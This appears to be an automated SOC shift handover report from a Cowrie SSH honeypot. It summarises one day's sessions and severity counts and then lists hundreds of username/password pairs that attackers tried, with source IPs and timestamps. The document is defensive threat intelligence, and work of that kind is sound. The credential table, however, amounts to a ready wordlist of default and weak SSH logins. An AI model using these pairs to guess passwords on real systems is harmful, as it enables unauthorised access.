# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-27 |
| **Generated At** | 2026-09-27T18:09:59Z |
| **Shift Time** | 18:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **493** |
| Confirmed Threats | **479** |
| False Positives Filtered | **14** (2.8%) |
| Unique Attacker IPs | **88** |
| Countries of Origin | **30** |
| High Severity Cases | **393** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **100** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **408** |
| Unique Credential Pairs | **361** |
| Unique Usernames | **136** |
| Unique Passwords | **272** |
| Successful Auth Pairs | **401** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 157 |
| `345gs5662d34` | 25 |
| `admin` | 15 |
| `ubuntu` | 8 |
| `deploy` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 25 |
| `3245gs5662d34` | 25 |
| `123456` | 15 |
| `1234` | 11 |
| `123` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 25 |
| `root` | `3245gs5662d34` | 9 |
| `admin` | `admin` | 7 |
| `support` | `support` | 6 |
| `root` | `admin` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `master` | `master` | `109.160.32.65` | 2026-09-27T12:55:04 |
| `root` | `test123!` | `109.160.32.65` | 2026-09-27T12:55:09 |
| `root` | `1QAZ2wsx` | `109.160.32.65` | 2026-09-27T12:55:14 |
| `omm` | `omm` | `109.160.32.65` | 2026-09-27T12:55:18 |
| `core` | `P@ssw0rd` | `109.160.32.65` | 2026-09-27T12:55:23 |
| `ikea` | `ikea` | `109.160.32.65` | 2026-09-27T12:55:28 |
| `lenovo` | `Admin@9000` | `109.160.32.65` | 2026-09-27T12:55:32 |
| `amir` | `amir` | `109.160.32.65` | 2026-09-27T12:55:38 |
| `root` | `abc123456` | `109.160.32.65` | 2026-09-27T12:55:43 |
| `root` | `nPSpP4PBW0` | `109.160.32.65` | 2026-09-27T12:55:47 |
| `root` | `admin` | `109.160.32.65` | 2026-09-27T12:55:52 |
| `admin` | `masterkey` | `109.160.32.65` | 2026-09-27T12:55:57 |
| `git` | `1234` | `109.160.32.65` | 2026-09-27T12:56:02 |
| `root` | `P@ssw0rd!` | `109.160.32.65` | 2026-09-27T12:56:07 |
| `postgres` | `123456` | `109.160.32.65` | 2026-09-27T12:56:11 |
| `admin` | `qwertyuiop` | `109.160.32.65` | 2026-09-27T12:56:17 |
| `devops` | `12345` | `109.160.32.65` | 2026-09-27T12:56:21 |
| `ftpuser1` | `123456` | `109.160.32.65` | 2026-09-27T12:56:26 |
| `root` | `=` | `109.160.32.65` | 2026-09-27T12:56:32 |
| `ftpuser` | `123` | `109.160.32.65` | 2026-09-27T12:56:36 |
| `root` | `123admin` | `109.160.32.65` | 2026-09-27T12:56:41 |
| `23 root` | `` | `94.154.43.69` | 2026-09-27T12:56:43 |
| `sam` | `123456789` | `109.160.32.65` | 2026-09-27T12:56:47 |
| `lin` | `123456` | `109.160.32.65` | 2026-09-27T12:56:52 |
| `root` | `adgjmptw` | `109.160.32.65` | 2026-09-27T12:56:57 |
| `playground` | `playground` | `109.160.32.65` | 2026-09-27T12:57:01 |
| `root` | `carnaval` | `109.160.32.65` | 2026-09-27T12:57:06 |
| `ubuntu` | `p@ssw0rd` | `109.160.32.65` | 2026-09-27T12:57:11 |
| `aiuser` | `aiuser` | `109.160.32.65` | 2026-09-27T12:57:16 |
| `dev` | `password` | `109.160.32.65` | 2026-09-27T12:57:21 |
| `appuser` | `password` | `109.160.32.65` | 2026-09-27T12:57:26 |
| `root` | `root@1234` | `109.160.32.65` | 2026-09-27T12:57:31 |
| `root` | `abcdefg` | `109.160.32.65` | 2026-09-27T12:57:36 |
| `customer` | `customer` | `109.160.32.65` | 2026-09-27T12:57:40 |
| `root` | `12341234` | `109.160.32.65` | 2026-09-27T12:57:45 |
| `root` | `ubuntu1234` | `109.160.32.65` | 2026-09-27T12:57:51 |
| `myuser` | `myuser` | `109.160.32.65` | 2026-09-27T12:57:56 |
| `user2` | `1` | `109.160.32.65` | 2026-09-27T12:58:00 |
| `root` | `fsagfg.66` | `109.160.32.65` | 2026-09-27T12:58:05 |
| `webadmin` | `1234` | `109.160.32.65` | 2026-09-27T12:58:10 |
| `palworld` | `palworld` | `109.160.32.65` | 2026-09-27T12:58:15 |
| `root` | `1418` | `109.160.32.65` | 2026-09-27T12:58:20 |
| `claude` | `12345678` | `109.160.32.65` | 2026-09-27T12:58:25 |
| `root` | `UEPGGcGNoD` | `47.97.65.12` | 2026-09-27T12:58:26 |
| `root` | `ZO7yNHTtMu` | `47.97.65.12` | 2026-09-27T12:58:28 |
| `root` | `domino` | `109.160.32.65` | 2026-09-27T12:58:30 |
| `root` | `11223344` | `109.160.32.65` | 2026-09-27T12:58:35 |
| `student` | `student123` | `109.160.32.65` | 2026-09-27T12:58:39 |
| `ubuntu` | `Qwer1234` | `109.160.32.65` | 2026-09-27T12:58:45 |
| `wang` | `123456` | `109.160.32.65` | 2026-09-27T12:58:50 |
| `deploy` | `password` | `109.160.32.65` | 2026-09-27T12:58:55 |
| `root` | `devops123` | `109.160.32.65` | 2026-09-27T12:58:59 |
| `root` | `147963` | `109.160.32.65` | 2026-09-27T12:59:04 |
| `rock` | `rock` | `109.160.32.65` | 2026-09-27T12:59:09 |
| `appuser` | `root` | `109.160.32.65` | 2026-09-27T12:59:14 |
| `root` | `abc12345` | `109.160.32.65` | 2026-09-27T12:59:19 |
| `root` | `1qazxsw2` | `109.160.32.65` | 2026-09-27T12:59:24 |
| `root` | `a123456` | `109.160.32.65` | 2026-09-27T12:59:29 |
| `ansible` | `ansible` | `109.160.32.65` | 2026-09-27T12:59:34 |
| `njupt078` | `Huawei@123` | `109.160.32.65` | 2026-09-27T12:59:40 |
| `deployer` | `deployer` | `109.160.32.65` | 2026-09-27T12:59:43 |
| `pi` | `raspberry` | `109.160.32.65` | 2026-09-27T12:59:49 |
| `ubuntu` | `.` | `109.160.32.65` | 2026-09-27T12:59:54 |
| `oracle` | `oracle123` | `109.160.32.65` | 2026-09-27T12:59:59 |
| `user` | `password` | `109.160.32.65` | 2026-09-27T13:00:04 |
| `minecraft` | `1` | `109.160.32.65` | 2026-09-27T13:00:09 |
| `root` | `P@ssword` | `109.160.32.65` | 2026-09-27T13:00:14 |
| `iksulata` | `iksulata` | `109.160.32.65` | 2026-09-27T13:00:19 |
| `root` | `Server2026!` | `109.160.32.65` | 2026-09-27T13:00:24 |
| `root` | `p@ssword` | `109.160.32.65` | 2026-09-27T13:00:29 |
| `dev` | `abc123` | `109.160.32.65` | 2026-09-27T13:00:34 |
| `git` | `123` | `109.160.32.65` | 2026-09-27T13:00:39 |
| `ubuntu` | `password` | `109.160.32.65` | 2026-09-27T13:00:45 |
| `deploy` | `qwerty123` | `109.160.32.65` | 2026-09-27T13:00:50 |
| `root` | `MAGICROOTPASSWORD` | `109.160.32.65` | 2026-09-27T13:00:55 |
| `cloud` | `Wangsu@2017` | `109.160.32.65` | 2026-09-27T13:01:01 |
| `root` | `Pass@123` | `109.160.32.65` | 2026-09-27T13:01:05 |
| `root` | `Qwert@123456` | `109.160.32.65` | 2026-09-27T13:01:10 |
| `clawdbot` | `clawdbot` | `109.160.32.65` | 2026-09-27T13:01:15 |
| `minecraft` | `12345` | `109.160.32.65` | 2026-09-27T13:01:20 |
| `deploy` | `123123` | `109.160.32.65` | 2026-09-27T13:01:25 |
| `ls` | `qwe123!@` | `109.160.32.65` | 2026-09-27T13:01:30 |
| `ubuntu` | `admin@123` | `109.160.32.65` | 2026-09-27T13:01:34 |
| `cursor` | `cursor` | `109.160.32.65` | 2026-09-27T13:01:39 |
| `root` | `123456qq@` | `109.160.32.65` | 2026-09-27T13:01:44 |
| `root` | `qwerty123` | `109.160.32.65` | 2026-09-27T13:01:49 |
| `user` | `123456` | `109.160.32.65` | 2026-09-27T13:01:54 |
| `rahul` | `123456` | `109.160.32.65` | 2026-09-27T13:02:00 |
| `root` | `1978` | `109.160.32.65` | 2026-09-27T13:02:04 |
| `root` | `huawei@123` | `109.160.32.65` | 2026-09-27T13:02:09 |
| `deploy` | `deploy@123` | `109.160.32.65` | 2026-09-27T13:02:14 |
| `root` | `1qaz@WSX` | `109.160.32.65` | 2026-09-27T13:02:19 |
| `root` | `11223344556677889900` | `109.160.32.65` | 2026-09-27T13:02:24 |
| `root` | `Aa123456@` | `109.160.32.65` | 2026-09-27T13:02:28 |
| `wildfly` | `Rdf@2018` | `109.160.32.65` | 2026-09-27T13:02:34 |
| `jenkins` | `jenkins@123` | `109.160.32.65` | 2026-09-27T13:02:39 |
| `root` | `rootroot` | `109.160.32.65` | 2026-09-27T13:02:43 |
| `root` | `Admin@123.` | `109.160.32.65` | 2026-09-27T13:02:48 |
| `root` | `000000` | `109.160.32.65` | 2026-09-27T13:02:54 |
| `liquid` | `liquid` | `109.160.32.65` | 2026-09-27T13:02:58 |
| `support` | `support123` | `109.160.32.65` | 2026-09-27T13:03:04 |
| `root` | `12qwaszx!@QWASZX` | `109.160.32.65` | 2026-09-27T13:03:09 |
| `root` | `1q2w3e4r5t` | `109.160.32.65` | 2026-09-27T13:03:14 |
| `deployer` | `deployer123` | `109.160.32.65` | 2026-09-27T13:03:18 |
| `felix` | `1234567890` | `109.160.32.65` | 2026-09-27T13:03:23 |
| `root` | `!QAZ2wsx3edc` | `109.160.32.65` | 2026-09-27T13:03:28 |
| `user` | `12345678` | `109.160.32.65` | 2026-09-27T13:03:33 |
| `debian` | `debian` | `109.160.32.65` | 2026-09-27T13:03:38 |
| `root` | `passwd1` | `109.160.32.65` | 2026-09-27T13:03:42 |
| `root` | `qaz1315@ZXC` | `109.160.32.65` | 2026-09-27T13:03:47 |
| `root` | `24041988` | `109.160.32.65` | 2026-09-27T13:03:52 |
| `admin1` | `12345678` | `109.160.32.65` | 2026-09-27T13:03:57 |
| `openclaw` | `1234` | `109.160.32.65` | 2026-09-27T13:04:02 |
| `gitlab-runner` | `gitlab-runner` | `109.160.32.65` | 2026-09-27T13:04:07 |
| `prueba` | `prueba` | `109.160.32.65` | 2026-09-27T13:04:12 |
| `user` | `user1234` | `109.160.32.65` | 2026-09-27T13:04:17 |
| `Caps` | `Caps` | `109.160.32.65` | 2026-09-27T13:04:22 |
| `root` | `Huawei!@` | `109.160.32.65` | 2026-09-27T13:04:28 |
| `admin` | `qwert1` | `109.160.32.65` | 2026-09-27T13:04:33 |
| `root` | `123123asd` | `109.160.32.65` | 2026-09-27T13:04:38 |
| `root` | `qq123456` | `109.160.32.65` | 2026-09-27T13:04:43 |
| `root` | `13131313` | `109.160.32.65` | 2026-09-27T13:04:48 |
| `root` | `root@2026` | `109.160.32.65` | 2026-09-27T13:04:52 |
| `root` | `root1234` | `109.160.32.65` | 2026-09-27T13:04:57 |
| `root` | `qwe@123` | `109.160.32.65` | 2026-09-27T13:05:02 |
| `root` | `Abc12345` | `109.160.32.65` | 2026-09-27T13:05:07 |
| `admin` | `abc123` | `109.160.32.65` | 2026-09-27T13:05:12 |
| `user` | `Aa123456` | `109.160.32.65` | 2026-09-27T13:05:18 |
| `osmc` | `osmc` | `109.160.32.65` | 2026-09-27T13:05:23 |
| `root` | `2244` | `109.160.32.65` | 2026-09-27T13:05:28 |
| `root` | `test@123` | `109.160.32.65` | 2026-09-27T13:05:33 |
| `service` | `service` | `109.160.32.65` | 2026-09-27T13:05:38 |
| `vbox` | `123456` | `109.160.32.65` | 2026-09-27T13:05:43 |
| `root` | `qwer1234` | `109.160.32.65` | 2026-09-27T13:05:48 |
| `root` | `uuuuuuuu` | `109.160.32.65` | 2026-09-27T13:05:53 |
| `saurav` | `saurav` | `109.160.32.65` | 2026-09-27T13:05:58 |
| `root` | `heslo` | `109.160.32.65` | 2026-09-27T13:06:03 |
| `root` | `111111` | `109.160.32.65` | 2026-09-27T13:06:08 |
| `root` | `encore` | `109.160.32.65` | 2026-09-27T13:06:13 |
| `root` | `customer` | `109.160.32.65` | 2026-09-27T13:06:18 |
| `bot` | `bot` | `109.160.32.65` | 2026-09-27T13:06:23 |
| `ubuntu` | `qwe123` | `109.160.32.65` | 2026-09-27T13:06:28 |
| `deploy` | `1q2w3e4r` | `109.160.32.65` | 2026-09-27T13:06:33 |
| `teamspeak` | `root` | `109.160.32.65` | 2026-09-27T13:06:38 |
| `root` | `asdqwe123` | `109.160.32.65` | 2026-09-27T13:06:43 |
| `root` | `P@ssword123` | `109.160.32.65` | 2026-09-27T13:06:48 |
| `root` | `1234!@` | `109.160.32.65` | 2026-09-27T13:06:52 |
| `root` | `Adc123456` | `109.160.32.65` | 2026-09-27T13:06:58 |
| `openclaw` | `12345` | `109.160.32.65` | 2026-09-27T13:07:02 |
| `root` | `CatCult2025!` | `109.160.32.65` | 2026-09-27T13:07:08 |
| `m` | `m` | `109.160.32.65` | 2026-09-27T13:07:12 |
| `backup` | `backup` | `109.160.32.65` | 2026-09-27T13:07:18 |
| `root` | `centosadmin` | `109.160.32.65` | 2026-09-27T13:07:23 |
| `root` | `0987654321` | `109.160.32.65` | 2026-09-27T13:07:28 |
| `mysql` | `Originalcox!@` | `109.160.32.65` | 2026-09-27T13:07:33 |
| `root` | `14121996` | `109.160.32.65` | 2026-09-27T13:07:38 |
| `factorio` | `factorio` | `109.160.32.65` | 2026-09-27T13:07:42 |
| `mohammad` | `mohammad` | `109.160.32.65` | 2026-09-27T13:07:47 |
| `term2` | `term2` | `109.160.32.65` | 2026-09-27T13:07:52 |
| `admin` | `P@ssw0rd` | `109.160.32.65` | 2026-09-27T13:07:58 |
| `appuser` | `123456` | `109.160.32.65` | 2026-09-27T13:08:03 |
| `root` | `Aa123123` | `109.160.32.65` | 2026-09-27T13:08:08 |
| `postgres` | `postgres` | `109.160.32.65` | 2026-09-27T13:08:13 |
| `root` | `pass` | `109.160.32.65` | 2026-09-27T13:08:18 |
| `Asalem` | `Asalem` | `109.160.32.65` | 2026-09-27T13:08:22 |
| `user2` | `passwd` | `109.160.32.65` | 2026-09-27T13:08:28 |
| `trader` | `1234` | `109.160.32.65` | 2026-09-27T13:08:32 |
| `root` | `test1234` | `109.160.32.65` | 2026-09-27T13:08:38 |
| `samba` | `abcdef` | `109.160.32.65` | 2026-09-27T13:08:43 |
| `root` | `P@ssw0rd123` | `109.160.32.65` | 2026-09-27T13:08:47 |
| `john` | `123456` | `109.160.32.65` | 2026-09-27T13:08:53 |
| `admin` | `admin` | `77.90.185.17` | 2026-09-27T13:08:54 |
| `deploy` | `qwerty` | `109.160.32.65` | 2026-09-27T13:08:57 |
| `root` | `Aa123123@` | `109.160.32.65` | 2026-09-27T13:09:03 |
| `root` | `123321qwe` | `109.160.32.65` | 2026-09-27T13:09:07 |
| `jeet` | `jeet@123` | `109.160.32.65` | 2026-09-27T13:09:12 |
| `admin1` | `12345` | `109.160.32.65` | 2026-09-27T13:09:17 |
| `root` | `pornporn` | `109.160.32.65` | 2026-09-27T13:09:22 |
| `fastuser` | `fastuser` | `109.160.32.65` | 2026-09-27T13:09:27 |
| `crafty` | `12345678` | `109.160.32.65` | 2026-09-27T13:09:32 |
| `root` | `ubuntu` | `109.160.32.65` | 2026-09-27T13:09:37 |
| `minecraft` | `password` | `109.160.32.65` | 2026-09-27T13:09:42 |
| `elrond` | `elrond` | `109.160.32.65` | 2026-09-27T13:09:48 |
| `root` | `qwerty` | `109.160.32.65` | 2026-09-27T13:09:53 |
| `monitor` | `monitor` | `109.160.32.65` | 2026-09-27T13:09:58 |
| `webmaster` | `webmaster` | `109.160.32.65` | 2026-09-27T13:10:03 |
| `adminuser` | `123456` | `109.160.32.65` | 2026-09-27T13:10:08 |
| `root` | `orlando` | `109.160.32.65` | 2026-09-27T13:10:13 |
| `voip` | `voip` | `109.160.32.65` | 2026-09-27T13:10:19 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-27T13:10:21 |
| `root` | `baker` | `109.160.32.65` | 2026-09-27T13:10:23 |
| `root` | `1fuckyou` | `109.160.32.65` | 2026-09-27T13:10:28 |
| `media` | `rock` | `109.160.32.65` | 2026-09-27T13:10:33 |
| `root` | `19830602` | `109.160.32.65` | 2026-09-27T13:10:38 |
| `root` | `start` | `109.160.32.65` | 2026-09-27T13:10:42 |
| `root` | `vps12345678` | `109.160.32.65` | 2026-09-27T13:10:48 |
| `student` | `redhat` | `109.160.32.65` | 2026-09-27T13:10:52 |
| `runner` | `1234` | `109.160.32.65` | 2026-09-27T13:10:57 |
| `root` | `159357258` | `109.160.32.65` | 2026-09-27T13:11:03 |
| `developer` | `dev` | `109.160.32.65` | 2026-09-27T13:11:08 |
| `claude` | `123456` | `109.160.32.65` | 2026-09-27T13:11:12 |
| `kubernetes` | `kubernetes` | `109.160.32.65` | 2026-09-27T13:11:17 |
| `vagrant` | `vagrant` | `109.160.32.65` | 2026-09-27T13:11:22 |
| `cheryl` | `cheryl` | `109.160.32.65` | 2026-09-27T13:11:27 |
| `vps` | `vps` | `109.160.32.65` | 2026-09-27T13:11:32 |
| `user1` | `12345` | `109.160.32.65` | 2026-09-27T13:11:37 |
| `root` | `Welcome@123` | `109.160.32.65` | 2026-09-27T13:11:42 |
| `ubuntu` | `www.163.com` | `109.160.32.65` | 2026-09-27T13:11:46 |
| `root` | `toor` | `109.160.32.65` | 2026-09-27T13:11:52 |
| `root` | `jetsum@142025` | `109.160.32.65` | 2026-09-27T13:11:57 |
| `minecraft` | `123` | `109.160.32.65` | 2026-09-27T13:12:02 |
| `frappe` | `123` | `109.160.32.65` | 2026-09-27T13:12:06 |
| `demo` | `demo` | `109.160.32.65` | 2026-09-27T13:12:12 |
| `newuser` | `newuser` | `109.160.32.65` | 2026-09-27T13:12:16 |
| `test` | `1234qwer` | `109.160.32.65` | 2026-09-27T13:12:22 |
| `username` | `123` | `109.160.32.65` | 2026-09-27T13:12:27 |
| `root` | `menuiserie` | `109.160.32.65` | 2026-09-27T13:12:32 |
| `user` | `123` | `109.160.32.65` | 2026-09-27T13:12:37 |
| `test2` | `test2` | `109.160.32.65` | 2026-09-27T13:12:42 |
| `aishani` | `aishani@123` | `109.160.32.65` | 2026-09-27T13:12:47 |
| `elasticsearch` | `123456` | `109.160.32.65` | 2026-09-27T13:12:51 |
| `kingbase` | `kingbase@2022` | `109.160.32.65` | 2026-09-27T13:12:56 |
| `rancher` | `rancher` | `109.160.32.65` | 2026-09-27T13:13:01 |
| `minecraft` | `minecraft` | `109.160.32.65` | 2026-09-27T13:13:07 |
| `alex` | `alex` | `109.160.32.65` | 2026-09-27T13:13:11 |
| `root` | `pass1234` | `109.160.32.65` | 2026-09-27T13:13:16 |
| `user2` | `user2` | `109.160.32.65` | 2026-09-27T13:13:21 |
| `odoo18` | `123` | `109.160.32.65` | 2026-09-27T13:13:27 |
| `root` | `LeitboGi0ro` | `109.160.32.65` | 2026-09-27T13:13:31 |
| `root` | `qQ123456` | `109.160.32.65` | 2026-09-27T13:13:36 |
| `root` | `18273645` | `109.160.32.65` | 2026-09-27T13:13:41 |
| `paas` | `Huawei12` | `109.160.32.65` | 2026-09-27T13:13:46 |
| `christianna` | `christianna` | `109.160.32.65` | 2026-09-27T13:13:52 |
| `root` | `12qwaszx` | `109.160.32.65` | 2026-09-27T13:13:56 |
| `ubuntu` | `ubuntu123` | `109.160.32.65` | 2026-09-27T13:14:02 |
| `drcomadmin` | `drcomadmin123` | `109.160.32.65` | 2026-09-27T13:14:07 |
| `root` | `root123` | `109.160.32.65` | 2026-09-27T13:14:12 |
| `root` | `Ty123456@` | `109.160.32.65` | 2026-09-27T13:14:16 |
| `deploy` | `deploy123` | `109.160.32.65` | 2026-09-27T13:14:22 |
| `bitrix` | `master` | `109.160.32.65` | 2026-09-27T13:14:27 |
| `root` | `t0talc0ntr0l4!` | `109.160.32.65` | 2026-09-27T13:14:32 |
| `arthur` | `arthur` | `109.160.32.65` | 2026-09-27T13:14:37 |
| `root` | `12345` | `109.160.32.65` | 2026-09-27T13:14:42 |
| `root` | `Admin@2026` | `109.160.32.65` | 2026-09-27T13:14:47 |
| `botuser` | `123` | `109.160.32.65` | 2026-09-27T13:14:53 |
| `root` | `backup1234` | `109.160.32.65` | 2026-09-27T13:14:59 |
| `admin` | `root` | `109.160.32.65` | 2026-09-27T13:15:03 |
| `ben` | `ben` | `109.160.32.65` | 2026-09-27T13:15:07 |
| `guest` | `123456` | `109.160.32.65` | 2026-09-27T13:15:12 |
| `root` | `Pass1234` | `109.160.32.65` | 2026-09-27T13:15:17 |
| `superadmin` | `admin123` | `109.160.32.65` | 2026-09-27T13:15:21 |
| `developer` | `12345` | `109.160.32.65` | 2026-09-27T13:15:26 |
| `jenkins` | `1234` | `109.160.32.65` | 2026-09-27T13:15:31 |
| `newuser` | `123456` | `109.160.32.65` | 2026-09-27T13:15:35 |
| `sam` | `1234` | `109.160.32.65` | 2026-09-27T13:15:41 |
| `root` | `admin123` | `109.160.32.65` | 2026-09-27T13:15:45 |
| `root` | `linux123456789` | `109.160.32.65` | 2026-09-27T13:15:51 |
| `root` | `123@456` | `109.160.32.65` | 2026-09-27T13:15:56 |
| `root` | `123abc456` | `109.160.32.65` | 2026-09-27T13:16:01 |
| `root` | `phil` | `109.160.32.65` | 2026-09-27T13:16:05 |
| `louis` | `louis` | `68.183.92.206` | 2026-09-27T13:16:09 |
| `park` | `park` | `109.160.32.65` | 2026-09-27T13:16:11 |
| `345gs5662d34` | `345gs5662d34` | `68.183.92.206` | 2026-09-27T13:16:13 |
| `root` | `asd@123456789` | `109.160.32.65` | 2026-09-27T13:16:15 |
| `louis` | `3245gs5662d34` | `68.183.92.206` | 2026-09-27T13:16:15 |
| `git` | `123456` | `109.160.32.65` | 2026-09-27T13:16:20 |
| `doris` | `doris` | `109.160.32.65` | 2026-09-27T13:16:25 |
| `root` | `keines` | `109.160.32.65` | 2026-09-27T13:16:30 |
| `test` | `Test@123` | `109.160.32.65` | 2026-09-27T13:16:35 |
| `user2` | `123` | `109.160.32.65` | 2026-09-27T13:16:40 |
| `root` | `qazwsx123` | `109.160.32.65` | 2026-09-27T13:16:45 |
| `gns3` | `gns3` | `109.160.32.65` | 2026-09-27T13:16:50 |
| `test2` | `test123` | `14.224.213.222` | 2026-09-27T13:16:53 |
| `wjw` | `wjw2019` | `109.160.32.65` | 2026-09-27T13:16:55 |
| `root` | `mo2passe` | `109.160.32.65` | 2026-09-27T13:17:00 |
| `345gs5662d34` | `345gs5662d34` | `14.224.213.222` | 2026-09-27T13:17:02 |
| `test2` | `3245gs5662d34` | `14.224.213.222` | 2026-09-27T13:17:06 |
| `user1` | `1234` | `109.160.32.65` | 2026-09-27T13:17:06 |
| `root` | `zaq123zaq` | `109.160.32.65` | 2026-09-27T13:17:11 |
| `openvpn` | `12345678` | `109.160.32.65` | 2026-09-27T13:17:16 |
| `trader` | `12345` | `109.160.32.65` | 2026-09-27T13:17:20 |
| `michael` | `password` | `109.160.32.65` | 2026-09-27T13:17:25 |
| `username` | `1` | `109.160.32.65` | 2026-09-27T13:17:30 |
| `adm1n` | `adm1n` | `109.160.32.65` | 2026-09-27T13:17:35 |
| `root` | `qwe123asd123` | `172.191.239.155` | 2026-09-27T13:17:37 |
| `345gs5662d34` | `345gs5662d34` | `172.191.239.155` | 2026-09-27T13:17:39 |
| `root` | `3245gs5662d34` | `172.191.239.155` | 2026-09-27T13:17:39 |
| `john` | `john` | `109.160.32.65` | 2026-09-27T13:17:40 |
| `support` | `support` | `176.53.159.196` | 2026-09-27T13:17:43 |
| `postgres` | `123` | `109.160.32.65` | 2026-09-27T13:17:46 |
| `root` | `ABCabc123456.` | `109.160.32.65` | 2026-09-27T13:17:52 |
| `root` | `Qwer1234$` | `109.160.32.65` | 2026-09-27T13:17:56 |
| `root` | `Aa112211` | `109.160.32.65` | 2026-09-27T13:18:01 |
| `root` | `qwerty12345` | `109.160.32.65` | 2026-09-27T13:18:06 |
| `tom` | `tom` | `109.160.32.65` | 2026-09-27T13:18:12 |
| `sol` | `1234` | `109.160.32.65` | 2026-09-27T13:18:16 |
| `test` | `12345678` | `109.160.32.65` | 2026-09-27T13:18:21 |
| `root` | `******` | `109.160.32.65` | 2026-09-27T13:18:26 |
| `elasticsearch` | `elasticsearch@1234` | `109.160.32.65` | 2026-09-27T13:18:31 |
| `root` | `max123` | `59.179.31.237` | 2026-09-27T13:18:33 |
| `test` | `abc123` | `109.160.32.65` | 2026-09-27T13:18:36 |
| `345gs5662d34` | `345gs5662d34` | `59.179.31.237` | 2026-09-27T13:18:37 |
| `root` | `3245gs5662d34` | `59.179.31.237` | 2026-09-27T13:18:39 |
| `deploy` | `rootroot` | `109.160.32.65` | 2026-09-27T13:18:41 |
| `root` | `QWEasd123@` | `109.160.32.65` | 2026-09-27T13:18:46 |
| `mysql` | `mysql123` | `109.160.32.65` | 2026-09-27T13:18:51 |
| `root` | `dxfUgwfiNcx8` | `109.160.32.65` | 2026-09-27T13:18:56 |
| `root` | `12345123` | `109.160.32.65` | 2026-09-27T13:19:01 |
| `root` | `Ww12345678` | `152.52.15.213` | 2026-09-27T13:19:03 |
| `super` | `super` | `109.160.32.65` | 2026-09-27T13:19:06 |
| `345gs5662d34` | `345gs5662d34` | `152.52.15.213` | 2026-09-27T13:19:07 |
| `root` | `3245gs5662d34` | `152.52.15.213` | 2026-09-27T13:19:09 |
| `admin` | `admin!@` | `109.160.32.65` | 2026-09-27T13:19:11 |
| `rbs` | `rbs` | `106.38.205.224` | 2026-09-27T13:19:39 |
| `345gs5662d34` | `345gs5662d34` | `106.38.205.224` | 2026-09-27T13:19:43 |
| `rbs` | `3245gs5662d34` | `106.38.205.224` | 2026-09-27T13:19:45 |
| `magento` | `magento` | `23.227.147.163` | 2026-09-27T13:22:15 |
| `345gs5662d34` | `345gs5662d34` | `23.227.147.163` | 2026-09-27T13:22:16 |
| `magento` | `3245gs5662d34` | `23.227.147.163` | 2026-09-27T13:22:16 |
| `telecomadmin` | `admintelecom` | `138.226.239.233` | 2026-09-27T13:28:50 |
| `support` | `support` | `10.0.0.73` | 2026-09-27T13:43:21 |
| `test` | `1234` | `10.0.0.73` | 2026-09-27T13:55:10 |
| `admin` | `admin` | `85.211.244.194` | 2026-09-27T13:55:53 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-27T13:55:54 |
| `root` | `P@ssw0rd` | `138.226.239.233` | 2026-09-27T14:14:25 |
| `root` | `P@ssw0rd` | `77.90.185.17` | 2026-09-27T14:14:30 |
| `support` | `support` | `222.121.61.132` | 2026-09-27T14:15:59 |
| `andi` | `andi123` | `41.93.82.201` | 2026-09-27T14:26:35 |
| `345gs5662d34` | `345gs5662d34` | `41.93.82.201` | 2026-09-27T14:26:40 |
| `andi` | `3245gs5662d34` | `41.93.82.201` | 2026-09-27T14:26:42 |
| `admin` | `admin` | `169.58.65.110` | 2026-09-27T14:31:37 |
| `root` | `admin123..` | `165.154.162.74` | 2026-09-27T14:31:42 |
| `345gs5662d34` | `345gs5662d34` | `165.154.162.74` | 2026-09-27T14:31:44 |
| `root` | `3245gs5662d34` | `165.154.162.74` | 2026-09-27T14:31:44 |
| `mcserver` | `mcserver123` | `43.129.193.109` | 2026-09-27T14:32:22 |
| `345gs5662d34` | `345gs5662d34` | `43.129.193.109` | 2026-09-27T14:32:36 |
| `mcserver` | `3245gs5662d34` | `43.129.193.109` | 2026-09-27T14:32:39 |
| `mother` | `fucker` | `37.252.69.10` | 2026-09-27T14:35:48 |
| `root` | `` | `108.59.244.5` | 2026-09-27T14:43:09 |
| `agent` | `agent` | `42.96.19.37` | 2026-09-27T14:55:02 |
| `345gs5662d34` | `345gs5662d34` | `42.96.19.37` | 2026-09-27T14:55:08 |
| `agent` | `3245gs5662d34` | `42.96.19.37` | 2026-09-27T14:55:10 |
| `middleware` | `middleware` | `202.63.242.138` | 2026-09-27T14:59:50 |
| `345gs5662d34` | `345gs5662d34` | `202.63.242.138` | 2026-09-27T14:59:58 |
| `middleware` | `3245gs5662d34` | `202.63.242.138` | 2026-09-27T15:00:03 |
| `minecraft` | `minecraft2025` | `10.0.0.73` | 2026-09-27T15:23:32 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-27T15:23:35 |
| `minecraft` | `3245gs5662d34` | `10.0.0.73` | 2026-09-27T15:23:37 |
| `root` | `p@ssw0rd1$` | `38.132.122.177` | 2026-09-27T15:26:22 |
| `345gs5662d34` | `345gs5662d34` | `38.132.122.177` | 2026-09-27T15:26:24 |
| `root` | `3245gs5662d34` | `38.132.122.177` | 2026-09-27T15:26:24 |
| `reza` | `password123` | `10.0.0.73` | 2026-09-27T15:28:49 |
| `reza` | `3245gs5662d34` | `10.0.0.73` | 2026-09-27T15:28:50 |
| `root` | `amir1234` | `191.96.110.97` | 2026-09-27T15:38:43 |
| `345gs5662d34` | `345gs5662d34` | `191.96.110.97` | 2026-09-27T15:38:46 |
| `root` | `3245gs5662d34` | `191.96.110.97` | 2026-09-27T15:38:46 |
| `afzal` | `afzal` | `189.217.130.86` | 2026-09-27T15:39:06 |
| `345gs5662d34` | `345gs5662d34` | `189.217.130.86` | 2026-09-27T15:39:08 |
| `afzal` | `3245gs5662d34` | `189.217.130.86` | 2026-09-27T15:39:08 |
